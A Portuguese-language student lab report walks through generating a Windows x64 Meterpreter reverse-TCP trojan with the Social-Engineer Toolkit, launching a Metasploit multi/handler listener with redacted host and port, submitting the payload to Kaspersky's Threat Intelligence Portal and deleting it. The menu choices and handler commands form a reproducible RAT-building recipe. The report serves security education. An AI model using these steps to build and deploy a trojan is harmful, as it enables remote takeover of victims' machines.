# Atividade 2.1 — Criando um Trojan de Acesso Remoto com o Social-Engineer Toolkit

## Objetivo

Explorar, em um ambiente controlado de laboratório, o funcionamento do **Social-Engineer Toolkit (SET)** para geração de um payload de acesso remoto para Windows e observar como esse arquivo é identificado por uma solução de análise de malware.

A atividade teve como foco compreender o fluxo de criação de um payload, a configuração de um listener e a posterior análise do arquivo gerado em uma plataforma de Threat Intelligence.

> **Aviso:** a atividade foi realizada exclusivamente para fins acadêmicos e em ambiente de laboratório. O payload não foi executado contra nenhuma máquina vítima.

## Ambiente

* Kali Linux
* Terminal
* Social-Engineer Toolkit (SET)
* Metasploit Framework
* Firefox
* Kaspersky Threat Intelligence Portal
* Ambiente virtualizado de laboratório

## Procedimento

### 1. Acesso ao modo administrador

O Terminal foi aberto e o ambiente foi acessado com privilégios administrativos:

```bash
sudo -i
```

### 2. Inicialização do Social-Engineer Toolkit

Em seguida, foi executado o SET:

```bash
setoolkit
```

Na inicialização, os termos de uso foram apresentados e aceitos para prosseguir com a atividade.

A ferramenta apresentou o menu principal:

```text
Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit
```

Foi selecionada a opção:

```text
1) Social-Engineering Attacks
```

### 3. Criação do payload e listener

No menu de ataques de engenharia social, foi selecionada a opção responsável pela criação de payload e listener:

```text
Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 4
```

A opção `4` foi utilizada para acessar o processo de criação do payload.

### 4. Seleção do tipo de payload

Entre as opções disponíveis, foi selecionado o payload Windows x64 baseado em Meterpreter e comunicação reversa:

```text
   1) Windows Shell Reverse_TCP
   2) Windows Reverse_TCP Meterpreter
   3) Windows Reverse_TCP VNC DLL
   4) Windows Shell Reverse_TCP X64
   5) Windows Meterpreter Reverse_TCP X64
   6) Windows Meterpreter Egress Buster
   7) Windows Meterpreter Reverse HTTPS
   8) Windows Meterpreter Reverse DNS
   9) Download/Run your Own Executable
```

Foi utilizada a opção:

```text
5) Windows Meterpreter Reverse_TCP X64
```

O objetivo dessa etapa foi demonstrar como o SET pode gerar um executável compatível com Windows utilizando um payload de conexão reversa.

### 5. Geração do payload

Após a seleção do payload, o SET solicitou os parâmetros necessários para a configuração do listener no ambiente de laboratório.

Após a definição dos parâmetros, a ferramenta iniciou a geração:

```text
[*] Generating the payload.. please be patient.
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
```

O arquivo gerado foi:

```text
payload.exe
```

e ficou armazenado no diretório padrão utilizado pelo SET:

```text
/root/.set/payload.exe
```

### 6. Verificação do arquivo gerado

Foi aberto um segundo Terminal para verificar se o executável havia sido criado corretamente.

O diretório do SET foi acessado:

```bash
cd /root/.set/
```

Em seguida:

```bash
ls
```

A saída observada foi semelhante a:

```text
meta_config
payload.exe
set.options
version.lock
```

A presença do arquivo `payload.exe` confirmou que a etapa de geração havia sido concluída.

### 7. Inicialização do listener

Após a geração do arquivo, o SET foi instruído a iniciar o listener.

A ferramenta carregou o Metasploit Framework e configurou o módulo `multi/handler`:

```text
[*] Launching msfconsole, this could take a few to load. Be patient...

       =[ metasploit v6.3.54-dev
+ -- --=[ 2394 exploits - 1235 auxiliary - 422 post
+ -- --=[ 1388 payloads - 46 encoders - 11 nops
+ -- --=[ 9 evasion

Metasploit Documentation: https://docs.metasploit.com/

[*] Processing /root/.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/root/.set/meta_config)> set payload windows/x64/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST [configurado no laboratório]
resource (/root/.set/meta_config)> set LPORT [porta configurada no laboratório]
resource (/root/.set/meta_config)> set ExitOnSession false
resource (/root/.set/meta_config)> exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler
msf6 exploit(multi/handler) >
```

O resultado indica que o listener foi iniciado, porém nenhuma sessão foi criada, pois o payload **não foi executado em uma máquina vítima**, conforme determinado pelo próprio laboratório.

### 8. Encerramento do listener

Como não seria realizada a execução do payload em uma máquina Windows, o listener foi encerrado após a demonstração.

O terminal utilizado pelo SET/Metasploit foi finalizado com:

```text
Ctrl + C
```

### 9. Preparação do arquivo para análise

O arquivo `payload.exe` foi disponibilizado no diretório utilizado para a análise.

A existência do arquivo foi novamente verificada antes do envio:

```bash
ls
```

Resultado:

```text
meta_config
payload.exe
set.options
version.lock
```

O arquivo foi então utilizado somente para análise de segurança.

### 10. Análise no Kaspersky Threat Intelligence Portal

O navegador Firefox foi aberto e acessado o **Kaspersky Threat Intelligence Portal**.

O arquivo `payload.exe` foi enviado para análise através da opção de adição de arquivo.

Após o processamento, foram observadas as informações de detecção fornecidas pela plataforma.

A análise apresentou **detecção de malware**, com valor de detecções superior a zero.

Esse resultado confirma que o arquivo gerado pelo SET possui características reconhecidas como maliciosas pelas ferramentas de análise utilizadas pelo serviço.

> **Evidência principal da atividade:** resultado da análise do `payload.exe` no Kaspersky Threat Intelligence Portal.

### 11. Remoção do arquivo

Após a análise, o arquivo utilizado no laboratório foi removido.

O diretório de documentos foi acessado:

```bash
cd /home/aluno/Documentos/
```

E o arquivo foi excluído:

```bash
rm payload.exe
```

A remoção foi realizada para evitar que o artefato permanecesse desnecessariamente no ambiente de laboratório.

## Comandos utilizados

Os principais comandos utilizados durante a atividade foram:

```bash
sudo -i
setoolkit
```

Para verificar o payload gerado:

```bash
cd /root/.set/
ls
```

Para preparar o arquivo para análise:

```bash
cd /home/aluno/Documentos/
```

E, ao final, remover o artefato:

```bash
rm payload.exe
```

## Interpretação

O laboratório demonstrou o fluxo básico de criação e análise de um **Remote Access Trojan (RAT)**.

O SET automatizou a criação do payload e a configuração do listener, enquanto o Metasploit foi utilizado pelo processo para aguardar uma eventual conexão.

No entanto, o laboratório não realizou a etapa de execução do payload em uma máquina vítima. Dessa forma, não houve estabelecimento de sessão Meterpreter.

O ponto principal da atividade foi a análise do artefato gerado. O Kaspersky Threat Intelligence Portal identificou o arquivo como malicioso, demonstrando que um payload criado para estabelecer acesso remoto pode ser detectado por mecanismos de análise e inteligência de ameaças.

O fluxo observado pode ser representado de forma simplificada:

```text
SET
 │
 ├── Configuração do payload
 │
 ├── Geração do payload.exe
 │
 ├── Configuração do listener
 │
 └── Análise do artefato
          │
          ▼
Kaspersky Threat Intelligence Portal
          │
          ▼
   Detecção de malware
```

## Resultado

Foi possível:

* Inicializar o Social-Engineer Toolkit;
* Explorar suas opções de engenharia social;
* Criar um payload para Windows dentro do laboratório;
* Confirmar a criação do arquivo `payload.exe`;
* Observar a configuração do listener pelo Metasploit;
* Verificar que nenhuma sessão foi criada, pois o payload não foi executado;
* Submeter o artefato ao Kaspersky Threat Intelligence Portal;
* Observar a detecção do arquivo como malware;
* Remover o artefato após a análise.

A atividade permitiu relacionar a geração de um artefato malicioso com sua posterior identificação por uma ferramenta de Threat Intelligence.

## Conceitos praticados

* Social-Engineer Toolkit (SET)
* Remote Access Trojan (RAT)
* Malware
* Payload
* Meterpreter
* Reverse TCP
* Listener
* Metasploit Framework
* Threat Intelligence
* Análise de malware
* Detecção de artefatos maliciosos
* Segurança em ambientes controlados

## Evidência

A execução da atividade foi registrada no PDF de evidências da Aula 05–06.

[Ver evidências — Aula 05–06](https://github.com/Joaopmsitz/hackers-do-bem-labs/blob/main/fundamental/modulo-02/aula-05-06/evidencias.pdf)
